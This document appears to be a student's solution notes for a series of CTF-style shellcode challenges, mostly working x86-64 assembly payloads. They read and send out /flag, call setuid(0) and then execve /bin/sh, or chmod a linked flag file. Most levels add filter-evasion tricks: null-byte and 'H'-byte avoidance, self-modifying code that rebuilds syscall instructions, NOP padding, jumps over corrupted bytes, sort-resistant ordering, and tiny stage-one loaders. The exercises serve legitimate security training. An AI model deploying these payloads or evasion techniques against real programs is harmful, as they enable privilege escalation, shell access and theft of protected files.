# Shellcode exercises
To compile and give solution:
```
gcc -nostdlib -static -o file file.s
objcopy --dump-section .text=RawFile file
cat RawFile | /challenge/level_x
```
Before each source code:
```
.intel_syntax noprefix
.global _start
_start:
```
Base shellcode:  
```
mov     rbx, 0x00000067616c662f
push    rbx
mov     rax, 2
mov     rdi, rsp
mov     rsi, 0
syscall

mov     rdi, 1
mov     rsi, rax
mov     rdx, 0
mov     r10, 1000
mov     rax, 40
syscall
```
or
```
mov     rax, 105
mov     rdi, 0
syscall
mov     rax, 59
lea     rdi, [rip + bin]
mov     rsi, 0
mov     rdx, 0
syscall

bin: .string "/bin/sh"
```
or
```
# first, ln /flag a

xor     rax, rax
push    rax
mov     al, 90
pop     rsi
mov     sil, 7
push    word ptr 0x0061
mov     rdi, rsp
syscall
```

## ex 1
base shellcode
## ex 2
base shellcode with nop sled
## ex 3
+ the shellcode must have NO null bytes
```
mov     rbx, 0x67616c662f111111
shr     rbx, 24
push    rbx

xor	rax, rax
inc     rax
inc     rax		                # rax = 2
mov     rdi, rsp	            # rdi = address of /flag
xor     rsi, rsi	            # rsi = 0
xor	rdx, rdx	                # rdx = 0
syscall			                # open

xor     rdi, rdi
inc     rdi		                # rdi = 1
mov     rsi, rax	            # rsi = rax (return value of open)
xor     rdx, rdx	            # rdx = 0
mov     r10w, 1000	            # r10 = 1000
xor     rax, rax
mov     al, 0x28	            # rax = 40
syscall			                # sendfile
```
## ex 4
+ the shellcode must have NO 'H' bytes
```
mov     r10, 0x00000067616c662f
push    r10

push    2
pop     rax             # rax = 2
push    rsp
pop     rdi             # rdi = rsp
push    0
pop     rsi             # rsi = 0
push    0
pop     rdx             # rdx = 0
syscall                 # open

push    1
pop     rdi             # rdi = 1
push    rax
pop     rsi             # rsi = rax (return value of open)
push    0
pop     rdx             # rdx = 0
mov     r10, 1000       # r10 = 1000
push    40
pop     rax             # rax = 40
syscall                 # sendfile
```

## ex 5
+ the shellcode must have NO syscalls
+ forbidden byte sequences: 0f05 (`syscall`), 0f34 (`sysenter`), 80cd (`int`)
```
mov     rbx, 0x00000067616c662f
push    rbx
mov     rax, 2
mov     rdi, rsp
mov     rsi, 0
inc     BYTE PTR [rip]
.word   0x050e

mov     rdi, 1
mov     rsi, rax
mov     rdx, 0
mov     r10, 1000
mov     rax, 40
inc     BYTE PTR [rip]
.word   0x050e
```

## ex 6
+ the shellcode must have NO syscalls
+ forbidden byte sequences: 0f05 (`syscall`), 0f34 (`sysenter`), 80cd (`int`)
+ removing write permissions from first 4096 bytes of shellcode  
same as 5, but add 4096 nops before actual code

## ex 7
+ can't use stdin, stdout, stderr 

same as 8

## ex 8
+ reading 0x12 bytes from stdin
+ removing write permissions from first 4096 bytes of shellcode
```
xor     rax, rax
push    rax
mov     al, 90
pop     rsi
mov     sil, 7
push    word ptr 0x0061
mov     rdi, rsp
syscall
```

## ex 9
+ This challenge modified your shellcode by overwriting every other 10 bytes with 0xcc. 0xcc, when interpreted as an
instruction is an `INT 3`, which is an interrupt to call into the debugger. You must avoid these modifications in your
shellcode
```
mov     rax, 105
jmp     label1
nop

nop x 10
label1:

xor     rdi, rdi
syscall
jmp label2
nop
nop
nop

nop x 10
label2:

mov     rax, 59
jmp     label3
nop

nop x 10
label3:

lea     rdi, [rip + bin]
jmp     label4
nop

nop x 10
label4:

xor     rsi, rsi
xor     rdx, rdx
syscall
nop
nop

nop x 10

bin: .string "/bin/sh"
```

## ex 10
+ This challenge just sorted your shellcode using bubblesort. Keep in mind the impact of memory endianness on this sort
(e.g., the LSB being the right-most byte). This sort processed your shellcode 8 bytes at a time.
```
xor     rax, rax
push    rax
nop
nop
cmp     al, 01

mov     al, 90
pop     rsi
mov     sil, 7
cmp     al, 02

push    word ptr 0x0061
mov     rdi, rsp
cmp     al, 03

nop
nop
nop
nop
syscall
cmp     al, 04
```

## ex 11
+ This challenge just sorted your shellcode using bubblesort. Keep in mind the impact of memory endianness on this sort
(e.g., the LSB being the right-most byte). This sort processed your shellcode 8 bytes at a time.  
This challenge is about to close stdin, which means that it will be harder to pass in a stage-2 shellcode. You will need
to figure an alternate solution (such as unpacking shellcode in memory) to get past complex filters.

same as 10

## ex 12
+ This challenge requires that every byte in your shellcode is unique!
```
xor     eax, eax
push    rax
mov     al, 90
pop     rsi
mov     sil, 7
push    word ptr 0x0061
mov     rdi, rsp
syscall
```

## ex 13
+ Reading 0xc bytes from stdin.  
+ Removing write permissions from first 4096 bytes of shellcode.
```
push 90
pop rax
push 7
pop rsi
push 0x61
push rsp
pop rdi
syscall
```

## ex 14
+ Reading 0x6 bytes from stdin.
```
push rax
pop rdi
push rdx
pop rsi
syscall

.rept 12
nop
.endr

push 90
pop rax
push 7
pop rsi
push 0x61
push rsp
pop rdi
syscall
```